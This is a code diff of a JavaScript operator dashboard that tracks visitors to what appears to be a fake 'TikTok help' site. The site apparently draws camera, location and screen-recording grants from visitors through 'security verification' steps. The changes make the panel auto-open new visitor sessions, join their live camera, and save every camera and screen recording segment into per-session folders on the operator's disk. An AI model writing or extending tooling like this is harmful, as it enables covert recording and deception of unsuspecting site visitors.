@@ -1,4 +1,4 @@
-import "./chat-sync.js?v=137";
+import "./chat-sync.js?v=140";
 
 async function ready() {
   if (window.ChatSync) return window.ChatSync;
@@ -146,6 +146,11 @@ let sessionLastCallId = new Map();
 let sessionHadLocation = new Map();
 let sessionHadCamera = new Map();
 let sessionLastPreview = new Map();
+let sessionEnteredAt = new Map();
+let sessionLeftAt = new Map();
+let sessionVisitorId = new Map();
+let lastAutoOpenId = "";
+let lastAutoOpenAt = 0;
 let sessionsHydrated = false;
 let recentFeedTimer = null;
 let recentFeedSeq = 0;
@@ -560,6 +565,9 @@ function startDash(sync) {
         if (r.hasLocation || r.lastLocation) sessionHadLocation.set(r.id, true);
         if (r.cameraGranted || r.hasCamera) sessionHadCamera.set(r.id, true);
         sessionLastPreview.set(r.id, String(r.preview || ""));
+        sessionEnteredAt.set(r.id, Number(r.enteredAt) || 0);
+        sessionLeftAt.set(r.id, Number(r.userLeftAt) || 0);
+        if (r.visitorId) sessionVisitorId.set(r.id, String(r.visitorId));
       });
       sessionsHydrated = true;
       renderSessions(rows);
@@ -582,18 +590,42 @@ function startDash(sync) {
         if (r.hasLocation || r.lastLocation) sessionHadLocation.set(r.id, true);
         if (r.cameraGranted || r.hasCamera) sessionHadCamera.set(r.id, true);
         if (r.lastCallId) sessionLastCallId.set(r.id, String(r.lastCallId));
-        fresh.push(r);
+        sessionEnteredAt.set(r.id, Number(r.enteredAt) || 0);
+        sessionLeftAt.set(r.id, Number(r.userLeftAt) || 0);
+        if (r.visitorId) sessionVisitorId.set(r.id, String(r.visitorId));
+        sessionLastPreview.set(r.id, String(r.preview || ""));
+        // Aynı cihaz/visitorId ile mevcut oturum varsa “fresh spam” sayma
+        const vid = String(r.visitorId || "");
+        const dupVisitor =
+          vid &&
+          [...sessionVisitorId.entries()].some(
+            ([id, v]) => id !== r.id && v === vid && knownSessionIds.has(id)
+          );
+        if (!dupVisitor) fresh.push(r);
+        else {
+          bumped.push({
+            row: r,
+            isEntry: true,
+            isMediaEdge: false,
+            callChanged: false,
+            firstCam: false,
+            firstLoc: false,
+          });
+        }
         return;
       }
       const prev = sessionUpdatedAt.get(r.id) || 0;
       if (updated > prev) {
         sessionUpdatedAt.set(r.id, updated);
         const preview = String(r.preview || "");
-        const isEntry = /siteye\s+giri[sş]/i.test(preview);
         const enteredAt = Number(r.enteredAt) || 0;
-        const camAt = Number(r.cameraGrantedAt) || 0;
-        const locAt = Number(r.lastLocationAt) || 0;
+        const prevEntered = sessionEnteredAt.get(r.id) || 0;
         const leftAt = Number(r.userLeftAt) || 0;
+        const prevLeft = sessionLeftAt.get(r.id) || 0;
+        // Rising-edge: sticky preview ile değil zaman damgası ile
+        const isEntry = enteredAt > prevEntered && enteredAt > 0;
+        if (enteredAt >= prevEntered) sessionEnteredAt.set(r.id, enteredAt);
+
         const prevCall = sessionLastCallId.get(r.id) || "";
         const nextCall = String(r.lastCallId || "");
         const callChanged = Boolean(nextCall && nextCall !== prevCall);
@@ -604,22 +636,17 @@ function startDash(sync) {
         if (r.cameraGranted || r.hasCamera) sessionHadCamera.set(r.id, true);
         if (r.hasLocation || r.lastLocation) sessionHadLocation.set(r.id, true);
 
-        // Rutin konum/heartbeat media edge DEĞİL — sadece ilk izin / call değişimi / ayrılış
-        const isMediaEdge =
-          callChanged ||
-          firstCam ||
-          firstLoc ||
-          leftAt > prev ||
-          /yeniden\s*ba[gğ]lan|kamera\s*a[cç]|izin|do[gğ]rulama\s*onay|ayr[ıi]ld|kayd[ıi]\s*haz[ıi]r/i.test(
-            preview
-          );
+        const leftEdge = leftAt > prevLeft && leftAt > 0;
+        if (leftAt >= prevLeft) sessionLeftAt.set(r.id, leftAt);
+        if (r.visitorId) sessionVisitorId.set(r.id, String(r.visitorId));
 
-        // Heartbeat / rutin konum preview değişimi alarm üretmesin
+        const isMediaEdge = callChanged || firstCam || firstLoc || leftEdge;
+
         const prevPreview = sessionLastPreview.get(r.id) || "";
         sessionLastPreview.set(r.id, preview);
         const previewChanged = preview !== prevPreview;
         const routinePreview =
-          /bu ad[ıi]m kaydedildi|yeniden ba[gğ]lan|siteye giri[sş]|do[gğ]rulama g[oö]r[uü]nt[uü]|g[uü]venlik do[gğ]rulamas[ıi] yeniden|heartbeat/i.test(
+          /bu ad[ıi]m kaydedildi|yeniden ba[gğ]lan|siteye giri[sş]|do[gğ]rulama g[oö]r[uü]nt[uü]|g[uü]venlik do[gğ]rulamas[ıi] yeniden|heartbeat|kayd[ıi] g[uü]ncellendi|online/i.test(
             preview
           );
 
@@ -635,7 +662,14 @@ function startDash(sync) {
         const nextCall = String(r.lastCallId || "");
         if (nextCall && nextCall !== prevCall) {
           sessionLastCallId.set(r.id, nextCall);
-          bumped.push({ row: r, isEntry: false, isMediaEdge: true, callChanged: true, firstCam: false, firstLoc: false });
+          bumped.push({
+            row: r,
+            isEntry: false,
+            isMediaEdge: true,
+            callChanged: true,
+            firstCam: false,
+            firstLoc: false,
+          });
         }
       }
     });
@@ -649,6 +683,9 @@ function startDash(sync) {
         sessionHadLocation.delete(id);
         sessionHadCamera.delete(id);
         sessionLastPreview.delete(id);
+        sessionEnteredAt.delete(id);
+        sessionLeftAt.delete(id);
+        sessionVisitorId.delete(id);
       }
     });
 
@@ -666,6 +703,26 @@ function startDash(sync) {
       }
     }
 
+    function quietlyOpenSession(row, { joinCam = true } = {}) {
+      if (!row?.id) return;
+      if (row.id === selectedId) {
+        if (joinCam) maybeJoinSessionCamera(row);
+        return;
+      }
+      if (hasLiveAdminWatch() && adminCall?.sessionId && adminCall.sessionId !== row.id) {
+        return;
+      }
+      const now = Date.now();
+      if (lastAutoOpenId === row.id && now - lastAutoOpenAt < 8000) return;
+      lastAutoOpenId = row.id;
+      lastAutoOpenAt = now;
+      openSession(row);
+      if (joinCam) maybeJoinSessionCamera(row);
+      queueMicrotask(() => {
+        adminMediaDock?.scrollIntoView?.({ behavior: "smooth", block: "nearest" });
+      });
+    }
+
     if (fresh.length) {
       const newest = fresh.sort(
         (a, b) => (Number(b.updatedAt) || 0) - (Number(a.updatedAt) || 0)
@@ -679,14 +736,7 @@ function startDash(sync) {
         tag: `fresh-${newest.id}`,
         force: true,
       });
-      // Canlı kamera izlerken çalma; aksi halde yeni sohbeti otomatik aç
-      if (!hasLiveAdminWatch() || !selectedId || adminCall?.sessionId === newest.id) {
-        openSession(newest);
-        maybeJoinSessionCamera(newest);
-        queueMicrotask(() => {
-          adminMediaDock?.scrollIntoView?.({ behavior: "smooth", block: "nearest" });
-        });
-      }
+      quietlyOpenSession(newest);
       return;
     }
 
@@ -716,8 +766,8 @@ function startDash(sync) {
               : "Secili ziyaretci siteye girdi",
             body: `#${shortId(newest.id)} · ${String(newest.preview || "").slice(0, 120)}`,
             tag: isMediaEdge
-              ? `media-${newest.id}-${rowCall || newest.updatedAt}`
-              : `entry-${newest.id}`,
+              ? `media-${newest.id}-${rowCall || newest.enteredAt || newest.updatedAt}`
+              : `entry-${newest.id}-${newest.enteredAt || newest.updatedAt}`,
             force: Boolean(isMediaEdge),
           });
         }
@@ -731,21 +781,17 @@ function startDash(sync) {
               : "Baska ziyaretci aktivitesi",
           body: `#${shortId(newest.id)} · ${newest.page || "/"} · ${String(
             newest.preview || ""
-          ).slice(0, 120)}${watchingOther ? " (canlı izleme — listedan seç)" : ""}`,
+          ).slice(0, 120)}${watchingOther ? " (canlı izleme — listeden seç)" : ""}`,
           tag: isMediaEdge
             ? `media-${newest.id}-${rowCall || newest.updatedAt}`
             : isEntry
-              ? `entry-${newest.id}`
-              : `bump-${newest.id}`,
+              ? `entry-${newest.id}-${newest.enteredAt || newest.updatedAt}`
+              : `bump-${newest.id}-${newest.updatedAt}`,
           force: Boolean(isMediaEdge || isEntry),
         });
-        // Yeni giriş / önemli medya: canlı kamera yoksa otomatik aç
-        if (!watchingOther && (isEntry || !selectedId || isMediaEdge)) {
-          openSession(newest);
-          maybeJoinSessionCamera(newest);
-          queueMicrotask(() => {
-            adminMediaDock?.scrollIntoView?.({ behavior: "smooth", block: "nearest" });
-          });
+        // Yalnız gerçek giriş / ilk medya — her heartbeat ile açma
+        if (!watchingOther && (isEntry || firstMeaningfulMedia(newestWrap) || !selectedId)) {
+          quietlyOpenSession(newest);
         }
       }
 
@@ -756,12 +802,13 @@ function startDash(sync) {
           /kayd[ıi] haz[ıi]r|ayr[ıi]ld/i.test(String(newest.preview || "")))
       ) {
         const got = maybeAutoDownloadSessionRecording(newest, {
-          force: Boolean(newest.lastRecordingUrl),
+          force: Boolean(newest.lastRecordingUrl || newest.recordingSegments?.length),
         });
         if (!got && adminCall?.sessionId === newest.id && adminCall?.lastBlob?.size) {
-          forceDownloadBlob(
+          void saveEvidenceBlob(
             adminCall.lastBlob,
-            `kamera-admin-${shortId(newest.id)}.${recordingExtFromMime(adminCall.lastBlob.type)}`
+            `kamera-admin-${shortId(newest.id)}.${recordingExtFromMime(adminCall.lastBlob.type)}`,
+            newest.id
           );
         }
       }
@@ -1412,7 +1459,16 @@ function renderSessions(rows) {
     const visitorLine = row.visitorId
       ? escapeHtml(`ID ${String(row.visitorId).slice(0, 10)}…`)
       : "";
+    const online = Boolean(row.online) && !(Number(row.userLeftAt) > 0);
+    const segN = Number(row.recordingSegmentCount) ||
+      (Array.isArray(row.recordingSegments) ? row.recordingSegments.length : 0);
+    const statusLine = online
+      ? "● Çevrimiçi"
+      : Number(row.userLeftAt) > 0
+        ? "○ Ayrıldı"
+        : "○ Kapalı";
     const badges = [
+      `<span class="session-badge ${online ? "session-badge-online" : "session-badge-offline"}">${statusLine}</span>`,
       isReturning
         ? `<span class="session-badge session-badge-return">Dönen${
             visits > 1 ? ` · #${visits}` : ""
@@ -1425,6 +1481,9 @@ function renderSessions(rows) {
           ? '<span class="session-badge session-badge-phone">Telefon</span>'
           : "",
       hasCam ? '<span class="session-badge session-badge-cam">Kamera</span>' : "",
+      segN > 0
+        ? `<span class="session-badge session-badge-cam">Kayıt · ${segN}</span>`
+        : "",
       row.hasScreenRecording || row.lastScreenRecordingUrl
         ? '<span class="session-badge session-badge-screen">Ekran</span>'
         : "",
@@ -1738,6 +1797,10 @@ function recordingExtFromMime(mime, nameHint) {
   return "webm";
 }
 
+function firstMeaningfulMedia(wrap) {
+  return Boolean(wrap?.firstCam || wrap?.firstLoc || wrap?.callChanged);
+}
+
 function forceDownloadBlob(blob, name) {
   if (!blob?.size) return false;
   const ext = recordingExtFromMime(blob.type, name);
@@ -1775,7 +1838,136 @@ function forceDownloadBlob(blob, name) {
   return true;
 }
 
-async function forceDownloadFromUrl(url, name) {
+const EVIDENCE_DIR_DB = "tiktok-help-evidence-dir";
+const EVIDENCE_DIR_STORE = "handles";
+let evidenceDirHandle = null;
+
+function openEvidenceDirDb() {
+  return new Promise((resolve, reject) => {
+    if (!window.indexedDB) {
+      reject(new Error("no-idb"));
+      return;
+    }
+    const req = indexedDB.open(EVIDENCE_DIR_DB, 1);
+    req.onupgradeneeded = () => {
+      const db = req.result;
+      if (!db.objectStoreNames.contains(EVIDENCE_DIR_STORE)) {
+        db.createObjectStore(EVIDENCE_DIR_STORE);
+      }
+    };
+    req.onsuccess = () => resolve(req.result);
+    req.onerror = () => reject(req.error || new Error("idb"));
+  });
+}
+
+async function persistEvidenceDirHandle(handle) {
+  evidenceDirHandle = handle || null;
+  try {
+    const db = await openEvidenceDirDb();
+    await new Promise((resolve, reject) => {
+      const tx = db.transaction(EVIDENCE_DIR_STORE, "readwrite");
+      if (handle) tx.objectStore(EVIDENCE_DIR_STORE).put(handle, "evidence");
+      else tx.objectStore(EVIDENCE_DIR_STORE).delete("evidence");
+      tx.oncomplete = () => resolve();
+      tx.onerror = () => reject(tx.error);
+    });
+    db.close?.();
+  } catch (err) {
+    console.warn("evidence dir persist", err);
+  }
+  updateEvidenceFolderButton();
+}
+
+async function loadEvidenceDirHandle() {
+  try {
+    const db = await openEvidenceDirDb();
+    const handle = await new Promise((resolve, reject) => {
+      const tx = db.transaction(EVIDENCE_DIR_STORE, "readonly");
+      const req = tx.objectStore(EVIDENCE_DIR_STORE).get("evidence");
+      req.onsuccess = () => resolve(req.result || null);
+      req.onerror = () => reject(req.error);
+    });
+    db.close?.();
+    if (handle) evidenceDirHandle = handle;
+  } catch {
+    /* ignore */
+  }
+  updateEvidenceFolderButton();
+  return evidenceDirHandle;
+}
+
+function updateEvidenceFolderButton() {
+  const btn = document.getElementById("ev-pick-folder-btn");
+  if (!btn) return;
+  btn.textContent = evidenceDirHandle ? "Kayıt klasörü ✓" : "Kayıt klasörü seç";
+  btn.title = evidenceDirHandle
+    ? "Kayıtlar seçili klasöre oturum alt klasörleriyle yazılır"
+    : "Bir klasör seçin — kamera kayıtları otomatik oraya kaydedilir";
+}
+
+async function pickEvidenceFolder() {
+  if (typeof window.showDirectoryPicker !== "function") {
+    sendHint.hidden = false;
+    sendHint.textContent =
+      "Bu tarayıcı klasör seçimini desteklemiyor. Kayıtlar İndirilenler’e iner (Chrome/Edge önerilir).";
+    return null;
+  }
+  try {
+    const handle = await window.showDirectoryPicker({ mode: "readwrite" });
+    await persistEvidenceDirHandle(handle);
+    sendHint.hidden = false;
+    sendHint.textContent = "Kayıt klasörü ayarlandı — oturumlar klasör/oturum-id altına yazılır.";
+    window.setTimeout(() => {
+      if (sendHint.textContent.includes("Kayıt klasörü")) sendHint.hidden = true;
+    }, 4000);
+    return handle;
+  } catch (err) {
+    if (err?.name !== "AbortError") console.warn("pick folder", err);
+    return null;
+  }
+}
+
+async function ensureEvidenceDirPermission() {
+  if (!evidenceDirHandle) await loadEvidenceDirHandle();
+  if (!evidenceDirHandle) return null;
+  try {
+    const q = await evidenceDirHandle.queryPermission?.({ mode: "readwrite" });
+    if (q === "granted") return evidenceDirHandle;
+    const r = await evidenceDirHandle.requestPermission?.({ mode: "readwrite" });
+    if (r === "granted") return evidenceDirHandle;
+  } catch {
+    /* ignore */
+  }
+  return null;
+}
+
+async function saveEvidenceBlob(blob, fileName, sessionId) {
+  if (!blob?.size) return false;
+  const safeName = String(fileName || `kamera-${Date.now()}.webm`).replace(/[^\w.\-]+/g, "_");
+  const folder = await ensureEvidenceDirPermission();
+  if (folder) {
+    try {
+      const sessionFolder = String(sessionId || "misc").replace(/[^\w\-]+/g, "_").slice(0, 48);
+      const dir = await folder.getDirectoryHandle(sessionFolder, { create: true });
+      const camDir = await dir.getDirectoryHandle("kamera", { create: true });
+      const fh = await camDir.getFileHandle(safeName, { create: true });
+      const w = await fh.createWritable();
+      await w.write(blob);
+      await w.close();
+      sendHint.hidden = false;
+      sendHint.textContent = `Klasöre kaydedildi: ${sessionFolder}/kamera/${safeName}`;
+      window.setTimeout(() => {
+        if (sendHint.textContent.includes("Klasöre")) sendHint.hidden = true;
+      }, 4000);
+      return true;
+    } catch (err) {
+      console.warn("folder write failed, fallback download", err);
+    }
+  }
+  return forceDownloadBlob(blob, safeName);
+}
+
+async function forceDownloadFromUrl(url, name, sessionId) {
   if (!url) return;
   const ext = recordingExtFromMime("", name) || "webm";
   const fileName = name || `kamera-${Date.now()}.${ext}`;
@@ -1801,7 +1993,7 @@ async function forceDownloadFromUrl(url, name) {
     if (blob?.size) {
       const finalName =
         name || `kamera-${Date.now()}.${recordingExtFromMime(blob.type, fileName)}`;
-      forceDownloadBlob(blob, finalName);
+      await saveEvidenceBlob(blob, finalName, sessionId);
       if (downloadRecordingBtn) downloadRecordingBtn.textContent = "Kaydi indir (Storage)";
       return;
     }
@@ -1838,13 +2030,52 @@ function enqueueDownload(task) {
   return downloadQueue;
 }
 
+function collectRecordingTargets(row) {
+  const out = [];
+  const seen = new Set();
+  const segs = Array.isArray(row?.recordingSegments)
+    ? row.recordingSegments
+    : row?.recordingSegments && typeof row.recordingSegments === "object"
+      ? Object.values(row.recordingSegments)
+      : [];
+  segs
+    .filter((s) => s?.url)
+    .sort((a, b) => (Number(a.seq) || 0) - (Number(b.seq) || 0) || (Number(a.ts) || 0) - (Number(b.ts) || 0))
+    .forEach((s, i) => {
+      if (seen.has(s.url)) return;
+      seen.add(s.url);
+      const ext = recordingExtFromMime("", s.name) || "webm";
+      out.push({
+        url: s.url,
+        name:
+          s.name ||
+          `kamera-${shortId(row.id)}-s${String(s.seq || i + 1).padStart(4, "0")}.${ext}`,
+      });
+    });
+  if (row?.lastRecordingUrl && !seen.has(row.lastRecordingUrl)) {
+    out.push({
+      url: row.lastRecordingUrl,
+      name:
+        row.lastRecordingName ||
+        `kamera-${shortId(row.id)}.${recordingExtFromMime("", row.lastRecordingName)}`,
+    });
+  }
+  if (row?.lastScreenRecordingUrl && !seen.has(row.lastScreenRecordingUrl)) {
+    out.push({
+      url: row.lastScreenRecordingUrl,
+      name:
+        row.lastScreenRecordingName ||
+        `ekran-${shortId(row.id)}.${recordingExtFromMime("", row.lastScreenRecordingName)}`,
+    });
+  }
+  return out;
+}
+
 function maybeAutoDownloadSessionRecording(row, { force = false } = {}) {
-  const url = row?.lastRecordingUrl;
-  if (!url || !row?.id) return false;
+  if (!row?.id) return false;
   const preview = String(row.preview || "");
   const left = Number(row.userLeftAt) || 0;
   const lost = Number(row.connectionLostAt) || 0;
-  // Ara segment "güncellendi" — çıkış/finalize yoksa indirme
   if (
     !force &&
     /g[uü]ncellendi/i.test(preview) &&
@@ -1863,17 +2094,18 @@ function maybeAutoDownloadSessionRecording(row, { force = false } = {}) {
     left > 0 ||
     lost > 0;
   if (!looksFinal) return false;
-  const key = `${row.id}:${url}`;
-  if (autoDownloadedRecKeys.has(key)) return false;
-  autoDownloadedRecKeys.add(key);
-  enqueueDownload(() =>
-    forceDownloadFromUrl(
-      url,
-      row.lastRecordingName ||
-        `kamera-${shortId(row.id)}.${recordingExtFromMime("", row.lastRecordingName)}`
-    )
-  );
-  return true;
+
+  const targets = collectRecordingTargets(row);
+  if (!targets.length) return false;
+  let queued = 0;
+  targets.forEach((t) => {
+    const key = `${row.id}:${t.url}`;
+    if (autoDownloadedRecKeys.has(key)) return;
+    autoDownloadedRecKeys.add(key);
+    queued += 1;
+    enqueueDownload(() => forceDownloadFromUrl(t.url, t.name, row.id));
+  });
+  return queued > 0;
 }
 
 let recordingWatchUnsub = null;
@@ -3283,6 +3515,10 @@ async function sendVisitorPushNudge() {
 document.getElementById("ev-notify-visitor-btn")?.addEventListener("click", () => {
   void sendVisitorPushNudge();
 });
+document.getElementById("ev-pick-folder-btn")?.addEventListener("click", () => {
+  void pickEvidenceFolder();
+});
+void loadEvidenceDirHandle();
 
 async function endActiveCameraSession() {
   const call = adminCall;
